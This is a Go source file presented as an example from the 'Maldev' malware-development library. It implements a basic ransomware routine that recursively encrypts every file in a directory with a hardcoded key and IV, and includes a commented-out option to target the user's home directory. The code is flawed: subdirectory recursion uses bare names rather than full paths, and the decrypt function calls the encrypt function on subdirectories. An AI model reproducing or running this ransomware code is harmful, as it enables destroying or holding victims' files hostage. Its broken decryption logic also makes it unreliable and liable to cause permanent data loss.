package main

/*

This is one of the examples of the Maldev library
The creator is not responsible of any damage or harm done by this software, be careful

This file encrypts/decrypts all files in given directory (recursively)

*/

import (
  "fmt"
  "os"
  "strings"
  "log"

  //"github.com/D3Ext/maldev/files"
  "github.com/D3Ext/maldev/crypto"
)

var psk string = "ThisIsMySuperSecret32Password123"
var iv []byte = []byte("1010101010101010")

func RansomDir(dir_to_encrypt string) {
  dir_to_encrypt = strings.TrimSuffix(dir_to_encrypt, "/")

  dir, err := os.Open(dir_to_encrypt) // Open given directory
  if err != nil {
    log.Fatal(err)
  }

  objects, err := dir.Readdir(-1) // Get all files and directories in HOME folder

  for _, obj := range objects { // Iterate over all files or dirs
    if obj.IsDir() { // Check if current iteration is a directory
      RansomDir(obj.Name())
    } else {
      fmt.Println(obj.Name())
      err = crypto.EncryptFile(dir_to_encrypt + "/" + obj.Name(), psk, iv)
      if err != nil {
        log.Fatal(err)
      }
    }
  }
}

func DecryptDir(dir_to_decrypt string) {
  dir_to_decrypt = strings.TrimSuffix(dir_to_decrypt, "/")

  dir, err := os.Open(dir_to_decrypt) // Open given directory
  if err != nil {
    log.Fatal(err)
  }

  objects, err := dir.Readdir(-1) // Get all files and directories in HOME folder

  for _, obj := range objects { // Iterate over all files or dirs
    if obj.IsDir() { // Check if current iteration is a directory
      RansomDir(obj.Name())
    } else {
      fmt.Println(obj.Name())
      err = crypto.DecryptFile(dir_to_decrypt + "/" + obj.Name(), psk, iv)
      if err != nil {
        log.Fatal(err)
      }
    }
  } 
}

func main(){
  /*home_dir, err := os.UserHomeDir() // Get home directory
  if err != nil {
    log.Fatal(err)
  }*/

  RansomDir("/tmp/exampledir/")
  //DecryptDir("/tmp/exampledir/")
}


